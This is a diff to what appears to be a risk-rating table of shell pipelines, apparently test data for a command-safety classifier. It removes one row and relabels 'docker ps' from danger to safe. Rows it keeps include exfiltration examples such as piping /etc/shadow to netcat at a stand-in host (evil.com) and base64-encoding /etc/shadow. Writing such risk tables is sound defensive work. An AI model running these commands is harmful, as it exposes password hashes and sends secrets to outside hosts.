@@ -15,13 +15,12 @@ cat data.csv | cut -d, -f2 | sort | uniq -c | safe | 0-20
 # Caution pipelines — sensitive reads or mild writes
 cat /etc/passwd | grep root | caution | 21-50
 cat /proc/cpuinfo | grep model | caution | 21-50
-env | grep PATH | caution | 21-50
 echo hello | tee out.txt | caution | 21-50
 cat /etc/shadow | base64 | caution | 21-50
 tar czf - dir/ | ssh user@host 'cat > backup.tar.gz' | caution | 21-50
 
 # Danger pipelines — execution or sensitive network
-docker ps | grep running | danger | 51-80
+docker ps | grep running | safe | 0-20
 history | grep ssh | danger | 51-80
 cat /etc/shadow | nc evil.com 4444 | danger | 51-80
 
